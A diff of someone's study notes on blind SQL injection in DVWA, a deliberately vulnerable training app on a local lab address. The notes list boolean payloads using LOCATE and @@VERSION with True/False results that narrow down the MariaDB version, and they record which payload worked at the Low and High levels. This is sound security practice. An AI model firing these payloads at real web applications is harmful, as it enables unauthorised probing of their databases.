@@ -1,8 +1,9 @@
-10.4.17-MariaDB
-
-http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
-
-
+## Blind SQLi
+- This one is purely based on trial and error, where you request a query that results true and then request a query that returns false. And by doing that we can eventually guess stuff.
+- Below trial and error example is to get information regarding version of the data base
+- AUTOMATED TOOL IN PROGESS
+```
+// ACTUAL VERSION - 10.4.17-MariaDB
 
 1' AND LOCATE(10,@@VERSION); -- -      -> True
 
@@ -11,9 +12,6 @@ http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
 1' AND LOCATE(10.1,@@VERSION); -- -		-> False
 
 1' AND LOCATE(10.4,@@VERSION); -- -      -> True
-
-1' AND LOCATE(10.4,@@VERSION); -- -		->
-
 
 1' AND LOCATE(10.40,@@VERSION);-- -      -> False
 1' AND LOCATE(10.41,@@VERSION);-- -      -> False
@@ -26,9 +24,7 @@ http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
 1' AND LOCATE(10.48,@@VERSION);-- -      -> False
 1' AND LOCATE(10.49,@@VERSION);-- -      -> False
 
-
 1' AND LOCATE("10.4.",@@VERSION);-- -      -> True
-
 
 1' AND LOCATE("10.4.0",@@VERSION);-- -   -> False
 1' AND LOCATE("10.4.1",@@VERSION);-- -   -> True
@@ -71,5 +67,14 @@ http://192.168.0.105/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
 1' AND @@VERSION="10.4.17-MariaDB";-- -			-> True
 
 1' AND "10.4.17"=@@VERSION;-- -
+```
+
+## Low
+- `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked
+
+## Medium
+-
 
 
+## High
+- `1' AND @@VERSION="10.4.17-MariaDB";-- -` this worked
